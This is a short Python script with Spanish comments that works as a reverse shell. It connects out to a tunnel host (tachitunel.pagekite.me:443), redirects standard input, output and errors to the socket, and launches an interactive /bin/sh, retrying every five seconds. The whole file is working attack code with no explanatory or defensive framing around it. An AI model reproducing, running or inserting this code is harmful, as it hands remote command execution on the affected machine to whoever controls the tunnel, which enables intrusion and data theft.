import socket
import subprocess
import os
import time

while True:
    try:
        print("[*] Intentando conectar a tachitunel.pagekite.me:443...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("tachitunel.pagekite.me", 443))  # URL del túnel

        print("[+] Conexión establecida. Redirigiendo E/S...")

        # Redirige la entrada, salida y errores estándar al socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # Usa un shell interactivo
        subprocess.call(["/bin/sh", "-i"])
        break

    except Exception as e:
        print(f"[-] Error: {e}. Reintentando en 5 segundos...")
        time.sleep(5)
